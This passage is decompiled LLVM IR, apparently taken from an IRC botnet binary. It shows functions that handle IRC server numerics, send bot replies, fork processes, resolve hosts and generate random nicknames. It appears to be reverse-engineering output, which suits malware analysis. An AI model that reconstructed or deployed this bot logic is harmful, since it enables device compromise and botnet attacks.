dec_label_pc_10011c74:                            ; preds = %dec_label_pc_10011c08, %dec_label_pc_10011b88, %dec_label_pc_10011b7c, %dec_label_pc_1001183c, %dec_label_pc_1001173c, %dec_label_pc_1001163c, %dec_label_pc_1001153c, %dec_label_pc_1001143c, %dec_label_pc_1001133c, %dec_label_pc_1001123c, %dec_label_pc_1001113c, %dec_label_pc_1001103c, %dec_label_pc_10010f3c, %dec_label_pc_10010e60, %dec_label_pc_10010dc4, %dec_label_pc_10010d98, %entry
  %v2_10011c74 = load i32, i32* %stack_var_-2208, align 4
  %v1_10011c80 = add i32 %v2_10011c74, -12
  %v2_10011c80 = inttoptr i32 %v1_10011c80 to i32*
  %v3_10011c80 = load i32, i32* %v2_10011c80, align 4
  store i32 %v3_10011c80, i32* %r29.global-to-local, align 4
  %v0_10011c8c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10011c8c

; uselistorder directives
  uselistorder i32 %storemerge1318, { 1, 0 }
  uselistorder i32 %v2_10011c68, { 1, 0, 2 }
  uselistorder i32 %v2_10011b60, { 1, 0 }
  uselistorder i32 %storemerge14.lcssa, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10011a5c, { 0, 3, 4, 1, 5, 2 }
  uselistorder i32 %stack_var_-2160.031, { 3, 0, 2, 1 }
  uselistorder i32 %v2_10011a34, { 2, 1, 0 }
  uselistorder i32 %stack_var_-2156.2, { 3, 1, 2, 0 }
  uselistorder i32 %v1_100119e0, { 1, 0 }
  uselistorder i32 %stack_var_-2156.138, { 1, 0 }
  uselistorder i32 %storemerge1239, { 1, 0 }
  uselistorder i32 %v4_100119ec, { 1, 3, 0, 2 }
  uselistorder i8* %stack_var_-2152.044, { 0, 1, 5, 4, 2, 3 }
  uselistorder i32 %storemerge1145, { 1, 0 }
  uselistorder i32 %v0_10011920, { 1, 0, 2 }
  uselistorder i32 %v5_10011898, { 1, 0, 2 }
  uselistorder i32 %v2_10011850, { 1, 3, 2, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 %v5_10011798, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_10011750, { 1, 3, 2, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 %v5_10011698, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_10011650, { 1, 3, 2, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 %v5_10011598, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_10011550, { 1, 3, 2, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 %v5_10011498, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_10011450, { 0, 3, 2, 4, 6, 5, 1, 7, 8 }
  uselistorder i32 %v5_10011398, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_10011350, { 0, 3, 2, 4, 6, 5, 1, 7, 8 }
  uselistorder i32 %v5_10011298, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_10011250, { 0, 3, 2, 4, 6, 5, 1, 7, 8 }
  uselistorder i32 %v5_10011198, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_10011150, { 0, 3, 2, 4, 6, 5, 1, 7, 8 }
  uselistorder i32 %v5_10011098, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_10011050, { 0, 3, 2, 4, 6, 5, 1, 7, 8 }
  uselistorder i32 %v5_10010f98, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_10010f50, { 0, 3, 2, 4, 6, 5, 1, 7, 8 }
  uselistorder i32 %v2_10010e6c, { 1, 0, 2 }
  uselistorder i32 %v1_10010e08, { 3, 0, 1, 4, 2, 5 }
  uselistorder i32 %v2_10010de4, { 1, 0, 2 }
  uselistorder i32 %v2_10010d1c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-2200, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 167, 26, 27, 28, 29, 30, 31, 32, 7, 33, 2, 34, 35, 36, 40, 41, 37, 38, 39, 8, 9, 42, 43, 44, 45, 46, 47, 48, 52, 53, 49, 50, 51, 10, 11, 54, 55, 56, 57, 58, 59, 60, 64, 65, 61, 62, 63, 13, 12, 66, 67, 68, 69, 70, 71, 72, 76, 77, 73, 74, 75, 15, 14, 78, 79, 80, 81, 82, 83, 84, 88, 89, 85, 86, 87, 17, 16, 90, 91, 92, 93, 94, 95, 96, 100, 101, 97, 98, 99, 19, 18, 102, 103, 104, 105, 106, 107, 108, 112, 113, 109, 110, 111, 21, 20, 114, 115, 116, 117, 118, 119, 120, 124, 125, 121, 122, 123, 3, 22, 126, 127, 128, 129, 130, 131, 132, 136, 137, 133, 134, 135, 5, 4, 138, 139, 140, 141, 142, 143, 144, 148, 149, 145, 146, 147, 23, 6, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 1, 164, 165, 24, 166, 25, 168, 169, 0 }
  uselistorder i32* %r29.global-to-local, { 10, 11, 12, 2, 3, 13, 14, 4, 5, 15, 16, 0, 1, 17, 18, 6, 7, 19, 20, 8, 9 }
  uselistorder i32 268507392, { 1, 0 }
  uselistorder i32 268507136, { 1, 0 }
  uselistorder i32 268506880, { 1, 0 }
  uselistorder i32 268506624, { 1, 0 }
  uselistorder i32 268506368, { 1, 0 }
  uselistorder i32 268506112, { 1, 0 }
  uselistorder i32 268505856, { 1, 0 }
  uselistorder i32 268505600, { 1, 0 }
  uselistorder i32 268505344, { 1, 0 }
  uselistorder i32 (i32)* @pclose, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_1002d4a4.878 to i32), { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @feof, { 19, 9, 18, 8, 17, 7, 16, 6, 15, 5, 14, 4, 13, 3, 12, 2, 11, 1, 10, 0 }
  uselistorder i32 268505088, { 1, 0 }
  uselistorder [2 x i8]* @global_var_1002a6f0.111, { 1, 0 }
  uselistorder i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6f0.111, i32 0, i32 0), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @mfork, { 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 2, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 0, 5, 4, 3, 1 }
  uselistorder i8* @global_var_10045170.23, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 4, 3, 0, 1, 5, 2 }
  uselistorder i32 %arg2, { 4, 6, 5, 7, 9, 8, 10, 12, 11, 13, 15, 14, 16, 18, 17, 19, 21, 20, 22, 24, 23, 25, 27, 26, 28, 30, 29, 31, 33, 32, 3, 0, 1, 34, 2, 36, 35 }
  uselistorder i32 %arg1, { 2, 4, 3, 6, 5, 8, 7, 10, 9, 12, 11, 14, 13, 16, 15, 18, 17, 20, 19, 22, 21, 24, 23, 1, 0, 25 }
  uselistorder label %dec_label_pc_10011c08, { 1, 0 }
  uselistorder label %dec_label_pc_10011ac4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011aa4, { 1, 0 }
  uselistorder label %dec_label_pc_10011a58, { 1, 0 }
  uselistorder label %dec_label_pc_10011a20, { 1, 0 }
  uselistorder label %dec_label_pc_100119dc, { 1, 0 }
  uselistorder label %dec_label_pc_100119b0, { 1, 0 }
  uselistorder label %dec_label_pc_100119e8.preheader, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10011938, { 1, 0 }
  uselistorder label %dec_label_pc_1001191c, { 1, 0 }
  uselistorder label %dec_label_pc_100118a8, { 1, 0 }
  uselistorder label %dec_label_pc_1001181c, { 1, 0 }
  uselistorder label %dec_label_pc_100117a8, { 1, 0 }
  uselistorder label %dec_label_pc_1001171c, { 1, 0 }
  uselistorder label %dec_label_pc_100116a8, { 1, 0 }
  uselistorder label %dec_label_pc_1001161c, { 1, 0 }
  uselistorder label %dec_label_pc_100115a8, { 1, 0 }
  uselistorder label %dec_label_pc_1001151c, { 1, 0 }
  uselistorder label %dec_label_pc_100114a8, { 1, 0 }
  uselistorder label %dec_label_pc_1001141c, { 1, 0 }
  uselistorder label %dec_label_pc_100113a8, { 1, 0 }
  uselistorder label %dec_label_pc_1001131c, { 1, 0 }
  uselistorder label %dec_label_pc_100112a8, { 1, 0 }
  uselistorder label %dec_label_pc_1001121c, { 1, 0 }
  uselistorder label %dec_label_pc_100111a8, { 1, 0 }
  uselistorder label %dec_label_pc_1001111c, { 1, 0 }
  uselistorder label %dec_label_pc_100110a8, { 1, 0 }
  uselistorder label %dec_label_pc_1001101c, { 1, 0 }
  uselistorder label %dec_label_pc_10010fa8, { 1, 0 }
  uselistorder label %dec_label_pc_10010f1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10010e60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010e40, { 1, 0 }
  uselistorder label %dec_label_pc_10010d98, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010d78, { 1, 0 }
  uselistorder label %dec_label_pc_10010d10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010cf0, { 1, 0 }
}

define i32 @_376(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_10011cb4 = load i32, i32* @global_var_10045198.65, align 4
  %v6_10011ccc = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1002dfa8.920 to i32), i32 %v3_10011cb4, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v3_10011cd4 = load i32, i32* @global_var_100451c4.545, align 4
  %v3_10011cdc = load i32, i32* @global_var_100451bc.921, align 4
  %v6_10011cf8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1002dfb8.922 to i32), i32 %v3_10011cd4, i32 %v3_10011cdc)
  %v3_10011d00 = load i32, i32* @global_var_10045198.65, align 4
  %v6_10011d18 = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_1002dfc8.923 to i32), i32 %v3_10011d00, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v3_10011d20 = load i32, i32* @global_var_10045168.572, align 4
  %v3_10011d24 = icmp eq i32 %v3_10011d20, 0
  br i1 %v3_10011d24, label %dec_label_pc_10011d2c, label %dec_label_pc_10011d34

dec_label_pc_10011d2c:                            ; preds = %entry
  store i32 268508468, i32* @lr, align 4
  %v2_10011d30 = call i32 @SeigHeil(i32 %arg1, i32 268697600)
  br label %dec_label_pc_10011d34

dec_label_pc_10011d34:                            ; preds = %entry, %dec_label_pc_10011d2c
  %v0_10011d48 = phi i32 [ %v6_10011d18, %entry ], [ %v2_10011d30, %dec_label_pc_10011d2c ]
  ret i32 %v0_10011d48

; uselistorder directives
  uselistorder i32 (i32, i32)* @SeigHeil, { 1, 0 }
  uselistorder label %dec_label_pc_10011d34, { 1, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v6_10011d80 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1002dfd0.924 to i32), i32 %arg3, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  ret i32 %v6_10011d80
}

define i32 @_352(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-80 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10011d9c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10011d9c, i32* %stack_var_-80, align 4
  br label %dec_label_pc_10011df4.preheader

dec_label_pc_10011ddc:                            ; preds = %dec_label_pc_10011e0c
  %v4_10011e0c = ptrtoint i8* %stack_var_-68.057 to i32
  %v1_10011de0 = add i32 %v4_10011e0c, 1
  %v5_10011de4 = inttoptr i32 %v1_10011de0 to i8*
  %v1_10011dec = add i32 %stack_var_-60.056, 1
  store i32 %v1_10011dec, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10011dfc = call i32 @__GI_strlen()
  %v0_10011e04 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011e04 = icmp ult i32 %v0_10011e04, %v0_10011dfc
  br i1 %v2_10011e04, label %dec_label_pc_10011e0c, label %dec_label_pc_10011e20

dec_label_pc_10011e0c:                            ; preds = %dec_label_pc_10011df4.preheader, %dec_label_pc_10011ddc
  %stack_var_-68.057 = phi i8* [ %v5_10011de4, %dec_label_pc_10011ddc ], [ %stack_var_-68.163, %dec_label_pc_10011df4.preheader ]
  %stack_var_-60.056 = phi i32 [ %v1_10011dec, %dec_label_pc_10011ddc ], [ %stack_var_-60.162, %dec_label_pc_10011df4.preheader ]
  %v2_10011e10 = load i8, i8* %stack_var_-68.057, align 1
  %v3_10011e18 = icmp eq i8 %v2_10011e10, 32
  br i1 %v3_10011e18, label %dec_label_pc_10011e20, label %dec_label_pc_10011ddc

dec_label_pc_10011e20:                            ; preds = %dec_label_pc_10011ddc, %dec_label_pc_10011e0c, %dec_label_pc_10011df4.preheader
  %stack_var_-60.0.lcssa = phi i32 [ %stack_var_-60.162, %dec_label_pc_10011df4.preheader ], [ %v1_10011dec, %dec_label_pc_10011ddc ], [ %stack_var_-60.056, %dec_label_pc_10011e0c ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.163, %dec_label_pc_10011df4.preheader ], [ %v5_10011de4, %dec_label_pc_10011ddc ], [ %stack_var_-68.057, %dec_label_pc_10011e0c ]
  %v4_10011e20 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_10011e24 = add i32 %v4_10011e20, 1
  store i32 %stack_var_-60.0.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10011e34 = call i32 @__GI_strlen()
  %v0_10011e3c = load i32, i32* %r29.global-to-local, align 4
  %v4_10011e3c = icmp eq i32 %v0_10011e3c, %v0_10011e34
  br i1 %v4_10011e3c, label %dec_label_pc_100120fc, label %dec_label_pc_10011e44

dec_label_pc_10011e44:                            ; preds = %dec_label_pc_10011e20
  %v5_10011e28 = inttoptr i32 %v1_10011e24 to i8*
  %v1_10011e48 = add nuw nsw i32 %storemerge864, 1
  %tmp91 = icmp slt i32 %v1_10011e48, 5
  br i1 %tmp91, label %dec_label_pc_10011df4.preheader, label %dec_label_pc_10011e74.preheader

dec_label_pc_10011df4.preheader:                  ; preds = %entry, %dec_label_pc_10011e44
  %storemerge864 = phi i32 [ 0, %entry ], [ %v1_10011e48, %dec_label_pc_10011e44 ]
  %stack_var_-68.163 = phi i8* [ %arg3, %entry ], [ %v5_10011e28, %dec_label_pc_10011e44 ]
  %stack_var_-60.162 = phi i32 [ 0, %entry ], [ %stack_var_-60.0.lcssa, %dec_label_pc_10011e44 ]
  store i32 %stack_var_-60.162, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10011dfc51 = call i32 @__GI_strlen()
  %v0_10011e0452 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011e0453 = icmp ult i32 %v0_10011e0452, %v0_10011dfc51
  br i1 %v2_10011e0453, label %dec_label_pc_10011e0c, label %dec_label_pc_10011e20

dec_label_pc_10011e74.preheader:                  ; preds = %dec_label_pc_10011e44
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10011e24, i32* @r3, align 4
  %v0_10011e7c41 = call i32 @__GI_strlen()
  %v0_10011e8442 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011e8443 = icmp ult i32 %v0_10011e8442, %v0_10011e7c41
  br i1 %v2_10011e8443, label %dec_label_pc_10011e8c, label %dec_label_pc_10011eac

dec_label_pc_10011e68:                            ; preds = %dec_label_pc_10011e8c
  %v1_10011e6c = add i32 %storemerge946, 1
  store i32 %v1_10011e6c, i32* %r29.global-to-local, align 4
  store i32 %v1_10011e24, i32* @r3, align 4
  %v0_10011e7c = call i32 @__GI_strlen()
  %v0_10011e84 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011e84 = icmp ult i32 %v0_10011e84, %v0_10011e7c
  br i1 %v2_10011e84, label %dec_label_pc_10011e8c, label %dec_label_pc_10011eac

dec_label_pc_10011e8c:                            ; preds = %dec_label_pc_10011e74.preheader, %dec_label_pc_10011e68
  %storemerge946 = phi i32 [ %v1_10011e6c, %dec_label_pc_10011e68 ], [ 0, %dec_label_pc_10011e74.preheader ]
  %v2_10011e98 = add i32 %storemerge946, %v1_10011e24
  %v1_10011e9c = inttoptr i32 %v2_10011e98 to i8*
  %v2_10011e9c = load i8, i8* %v1_10011e9c, align 1
  %v3_10011ea4 = icmp eq i8 %v2_10011e9c, 32
  br i1 %v3_10011ea4, label %dec_label_pc_10011eac, label %dec_label_pc_10011e68

dec_label_pc_10011eac:                            ; preds = %dec_label_pc_10011e68, %dec_label_pc_10011e8c, %dec_label_pc_10011e74.preheader
  %storemerge9.lcssa = phi i32 [ 0, %dec_label_pc_10011e74.preheader ], [ %v1_10011e6c, %dec_label_pc_10011e68 ], [ %storemerge946, %dec_label_pc_10011e8c ]
  %v2_10011eb8 = add i32 %storemerge9.lcssa, %v1_10011e24
  %v3_10011ec0 = inttoptr i32 %v2_10011eb8 to i8*
  store i8 0, i8* %v3_10011ec0, align 1
  %v3_10011ec8 = load i32, i32* @global_var_10045198.65, align 4
  store i32 %v1_10011e24, i32* @r3, align 4
  store i32 %v3_10011ec8, i32* @r4, align 4
  %v3_10011ed4 = call i32 @__GI_strcasecmp(i32 %v1_10011e24, i32 %v3_10011ec8)
  %v3_10011edc = icmp eq i32 %v3_10011ed4, 0
  br i1 %v3_10011edc, label %dec_label_pc_10011ee4, label %dec_label_pc_100120fc

dec_label_pc_10011ee4:                            ; preds = %dec_label_pc_10011eac
  %v3_10011ee8 = load i32, i32* @global_var_10045178.30, align 4
  %v3_10011eec = icmp eq i32 %v3_10011ee8, 0
  br i1 %v3_10011eec, label %dec_label_pc_10011ef4, label %dec_label_pc_100120fc

dec_label_pc_10011ef4:                            ; preds = %dec_label_pc_10011ee4
  br label %dec_label_pc_10011f28.preheader

dec_label_pc_10011f10:                            ; preds = %dec_label_pc_10011f40
  %v4_10011f40 = ptrtoint i8* %stack_var_-68.233 to i32
  %v1_10011f14 = add i32 %v4_10011f40, 1
  %v5_10011f18 = inttoptr i32 %v1_10011f14 to i8*
  %v1_10011f20 = add i32 %stack_var_-60.232, 1
  store i32 %v1_10011f20, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10011f30 = call i32 @__GI_strlen()
  %v0_10011f38 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011f38 = icmp ult i32 %v0_10011f38, %v0_10011f30
  br i1 %v2_10011f38, label %dec_label_pc_10011f40, label %dec_label_pc_10011f54

dec_label_pc_10011f40:                            ; preds = %dec_label_pc_10011f28.preheader, %dec_label_pc_10011f10
  %stack_var_-68.233 = phi i8* [ %v5_10011f18, %dec_label_pc_10011f10 ], [ %stack_var_-68.339, %dec_label_pc_10011f28.preheader ]
  %stack_var_-60.232 = phi i32 [ %v1_10011f20, %dec_label_pc_10011f10 ], [ %stack_var_-60.338, %dec_label_pc_10011f28.preheader ]
  %v2_10011f44 = load i8, i8* %stack_var_-68.233, align 1
  %v3_10011f4c = icmp eq i8 %v2_10011f44, 32
  br i1 %v3_10011f4c, label %dec_label_pc_10011f54, label %dec_label_pc_10011f10

dec_label_pc_10011f54:                            ; preds = %dec_label_pc_10011f10, %dec_label_pc_10011f40, %dec_label_pc_10011f28.preheader
  %stack_var_-60.2.lcssa = phi i32 [ %stack_var_-60.338, %dec_label_pc_10011f28.preheader ], [ %v1_10011f20, %dec_label_pc_10011f10 ], [ %stack_var_-60.232, %dec_label_pc_10011f40 ]
  %stack_var_-68.2.lcssa = phi i8* [ %stack_var_-68.339, %dec_label_pc_10011f28.preheader ], [ %v5_10011f18, %dec_label_pc_10011f10 ], [ %stack_var_-68.233, %dec_label_pc_10011f40 ]
  %v4_10011f54 = ptrtoint i8* %stack_var_-68.2.lcssa to i32
  %v1_10011f58 = add i32 %v4_10011f54, 1
  store i32 %stack_var_-60.2.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10011f68 = call i32 @__GI_strlen()
  %v0_10011f70 = load i32, i32* %r29.global-to-local, align 4
  %v4_10011f70 = icmp eq i32 %v0_10011f70, %v0_10011f68
  br i1 %v4_10011f70, label %dec_label_pc_100120fc, label %dec_label_pc_10011f78

dec_label_pc_10011f78:                            ; preds = %dec_label_pc_10011f54
  %v5_10011f5c = inttoptr i32 %v1_10011f58 to i8*
  %v1_10011f7c = add nuw nsw i32 %storemerge1040, 1
  %tmp92 = icmp slt i32 %v1_10011f7c, 3
  br i1 %tmp92, label %dec_label_pc_10011f28.preheader, label %dec_label_pc_10011fa8.preheader

dec_label_pc_10011f28.preheader:                  ; preds = %dec_label_pc_10011ef4, %dec_label_pc_10011f78
  %storemerge1040 = phi i32 [ 0, %dec_label_pc_10011ef4 ], [ %v1_10011f7c, %dec_label_pc_10011f78 ]
  %stack_var_-68.339 = phi i8* [ %arg3, %dec_label_pc_10011ef4 ], [ %v5_10011f5c, %dec_label_pc_10011f78 ]
  %stack_var_-60.338 = phi i32 [ 0, %dec_label_pc_10011ef4 ], [ %stack_var_-60.2.lcssa, %dec_label_pc_10011f78 ]
  store i32 %stack_var_-60.338, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10011f3027 = call i32 @__GI_strlen()
  %v0_10011f3828 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011f3829 = icmp ult i32 %v0_10011f3828, %v0_10011f3027
  br i1 %v2_10011f3829, label %dec_label_pc_10011f40, label %dec_label_pc_10011f54

dec_label_pc_10011fa8.preheader:                  ; preds = %dec_label_pc_10011f78
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10011f58, i32* @r3, align 4
  %v0_10011fb018 = call i32 @__GI_strlen()
  %v0_10011fb819 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011fb820 = icmp ult i32 %v0_10011fb819, %v0_10011fb018
  br i1 %v2_10011fb820, label %dec_label_pc_10011fc0, label %dec_label_pc_10011fe0

dec_label_pc_10011f9c:                            ; preds = %dec_label_pc_10011fc0
  %v1_10011fa0 = add i32 %storemerge1123, 1
  store i32 %v1_10011fa0, i32* %r29.global-to-local, align 4
  store i32 %v1_10011f58, i32* @r3, align 4
  %v0_10011fb0 = call i32 @__GI_strlen()
  %v0_10011fb8 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011fb8 = icmp ult i32 %v0_10011fb8, %v0_10011fb0
  br i1 %v2_10011fb8, label %dec_label_pc_10011fc0, label %dec_label_pc_10011fe0

dec_label_pc_10011fc0:                            ; preds = %dec_label_pc_10011fa8.preheader, %dec_label_pc_10011f9c
  %storemerge1123 = phi i32 [ %v1_10011fa0, %dec_label_pc_10011f9c ], [ 0, %dec_label_pc_10011fa8.preheader ]
  %v2_10011fcc = add i32 %storemerge1123, %v1_10011f58
  %v1_10011fd0 = inttoptr i32 %v2_10011fcc to i8*
  %v2_10011fd0 = load i8, i8* %v1_10011fd0, align 1
  %v3_10011fd8 = icmp eq i8 %v2_10011fd0, 32
  br i1 %v3_10011fd8, label %dec_label_pc_10011fe0, label %dec_label_pc_10011f9c

dec_label_pc_10011fe0:                            ; preds = %dec_label_pc_10011f9c, %dec_label_pc_10011fc0, %dec_label_pc_10011fa8.preheader
  %storemerge11.lcssa = phi i32 [ 0, %dec_label_pc_10011fa8.preheader ], [ %v1_10011fa0, %dec_label_pc_10011f9c ], [ %storemerge1123, %dec_label_pc_10011fc0 ]
  %v2_10011fec = add i32 %storemerge11.lcssa, %v1_10011f58
  %v3_10011ff4 = inttoptr i32 %v2_10011fec to i8*
  store i8 0, i8* %v3_10011ff4, align 1
  store i32 268509184, i32* @lr, align 4
  %v2_10011ffc = call i32 @inet_addr(i32 %v1_10011f58)
  %v5_10012004 = trunc i32 %v2_10011ffc to i8
  store i8 %v5_10012004, i8* %stack_var_-56, align 1
  %v4_10012010 = icmp eq i8 %v5_10012004, -1
  br i1 %v4_10012010, label %dec_label_pc_10012018, label %dec_label_pc_10012084

dec_label_pc_10012018:                            ; preds = %dec_label_pc_10011fe0
  store i32 268509216, i32* @lr, align 4
  %v2_1001201c = call i32 @__GI_gethostbyname(i32 %v1_10011f58)
  %v3_1001202c = icmp eq i32 %v2_1001201c, 0
  br i1 %v3_1001202c, label %dec_label_pc_10012034, label %dec_label_pc_10012058

dec_label_pc_10012034:                            ; preds = %dec_label_pc_10012018
  %v3_10012038 = load i32, i32* @global_var_100451c4.545, align 4
  %v6_10012050 = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_1002dfdc.925 to i32), i32 %v3_10012038, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_100120fc

dec_label_pc_10012058:                            ; preds = %dec_label_pc_10012018
  %v2_10012058 = ptrtoint i8* %stack_var_-56 to i32
  %v1_10012060 = add i32 %v2_1001201c, 16
  %v2_10012060 = inttoptr i32 %v1_10012060 to i32*
  %v3_10012060 = load i32, i32* %v2_10012060, align 4
  %v1_10012064 = inttoptr i32 %v3_10012060 to i32*
  %v2_10012064 = load i32, i32* %v1_10012064, align 4
  %v1_1001206c = add i32 %v2_1001201c, 12
  %v2_1001206c = inttoptr i32 %v1_1001206c to i32*
  %v3_1001206c = load i32, i32* %v2_1001206c, align 4
  store i32 %v2_10012058, i32* @r3, align 4
  store i32 %v2_10012064, i32* @r4, align 4
  store i32 %v3_1001206c, i32* @r5, align 4
  store i32 268509316, i32* @lr, align 4
  %v0_10012080 = call i32 @memcpy()
  %v2_10012094.pre = load i8, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10012084

dec_label_pc_10012084:                            ; preds = %dec_label_pc_10011fe0, %dec_label_pc_10012058
  %v0_1001211475 = phi i32 [ %v0_10012080, %dec_label_pc_10012058 ], [ %v2_10011ffc, %dec_label_pc_10011fe0 ]
  %v2_10012094 = phi i8 [ %v2_10012094.pre, %dec_label_pc_10012058 ], [ %v5_10012004, %dec_label_pc_10011fe0 ]
  store i8 %v2_10012094, i8* bitcast (i8** @global_var_10045177.927 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_10045174.29 to i8*), align 4
  store i32 256, i32* @global_var_10045178.30, align 4
  br label %dec_label_pc_100120fc

dec_label_pc_100120fc:                            ; preds = %dec_label_pc_10011e20, %dec_label_pc_10011f54, %dec_label_pc_10011ee4, %dec_label_pc_10011eac, %dec_label_pc_10012034, %dec_label_pc_10012084
  %v0_10012114 = phi i32 [ 0, %dec_label_pc_10011ee4 ], [ %v3_10011ed4, %dec_label_pc_10011eac ], [ %v6_10012050, %dec_label_pc_10012034 ], [ %v0_1001211475, %dec_label_pc_10012084 ], [ %v0_10011f68, %dec_label_pc_10011f54 ], [ %v0_10011e34, %dec_label_pc_10011e20 ]
  %v2_100120fc = load i32, i32* %stack_var_-80, align 4
  %v1_10012108 = add i32 %v2_100120fc, -12
  %v2_10012108 = inttoptr i32 %v1_10012108 to i32*
  %v3_10012108 = load i32, i32* %v2_10012108, align 4
  store i32 %v3_10012108, i32* %r29.global-to-local, align 4
  ret i32 %v0_10012114

; uselistorder directives
  uselistorder i32 %stack_var_-60.338, { 2, 0, 1 }
  uselistorder i32 %v1_10011f7c, { 1, 0 }
  uselistorder i32 %v1_10011f58, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %stack_var_-60.162, { 2, 0, 1 }
  uselistorder i32 %v1_10011e48, { 1, 0 }
  uselistorder i32 %v1_10011e24, { 3, 2, 0, 1, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 8, 9, 10, 0, 1, 2, 3, 11, 12, 13, 14, 15, 16, 4, 5, 6, 7, 17, 18, 19, 20 }
  uselistorder i8** @global_var_10045174.29, { 0, 4, 3, 2, 1 }
  uselistorder i32* @global_var_10045178.30, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i8* %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100120fc, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10012084, { 1, 0 }
  uselistorder label %dec_label_pc_10011fe0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011fc0, { 1, 0 }
  uselistorder label %dec_label_pc_10011f28.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10011f54, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10011eac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011e8c, { 1, 0 }
  uselistorder label %dec_label_pc_10011df4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10011e20, { 2, 1, 0 }
}

define i32 @_433(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_1001213c = load i32, i32* @global_var_10045198.65, align 4
  store i32 %v3_1001213c, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10012148.930 to i32), i32* @lr, align 4
  %v0_10012144 = call i32 @free()
  store i32 268509524, i32* @lr, align 4
  %v2_10012150 = call i32 @realrand(i32 4, i32 8)
  store i32 268509536, i32* @lr, align 4
  %v1_1001215c = call i32 @randstring(i32 %v2_10012150)
